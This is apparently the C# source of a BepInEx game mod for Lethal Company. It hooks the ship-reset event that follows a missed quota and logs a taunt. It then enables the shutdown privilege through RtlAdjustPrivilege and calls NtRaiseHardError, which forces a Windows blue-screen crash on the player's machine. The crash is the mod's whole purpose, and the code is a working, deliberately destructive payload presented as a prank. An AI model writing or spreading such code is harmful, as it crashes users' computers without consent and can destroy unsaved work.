using System;
using System.Runtime.InteropServices;
using BepInEx;
using HarmonyLib;

namespace BSoMQ
{
    [BepInPlugin(GUID, NAME, VERSION)]
    public class Plugin : BaseUnityPlugin
    {
        private const string GUID = "gay.tigers.BSoMQ";
        private const string NAME = "BSoMQ";
        private const string VERSION = "1.0.0";
        const int STATUS_FLOAT_MULTIPLE_FAULTS = unchecked((int)0xC00002B4);

        private static Harmony Harmony = new Harmony(GUID);
        private static Plugin Instance;

        [DllImport("ntdll.dll")]
        public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

        [DllImport("ntdll.dll")]
        public static extern int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ResponseOption, out int Response);

        private Plugin()
        {
            Instance = this;
            Harmony.PatchAll();
        }

        private class HarmonyPatches
        {
            [HarmonyPatch(typeof(StartOfRound), nameof(StartOfRound.ResetShip), new Type[0])]
            class StartOfRoundPatch
            {
                static void Postfix()
                {
                    Instance.Logger.LogInfo("mogged #packwatch bozo shouldve met quota");
                    RtlAdjustPrivilege(19, true, false, out _);
                    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, IntPtr.Zero, 6, out _);
                }
            }
        }
    }
}
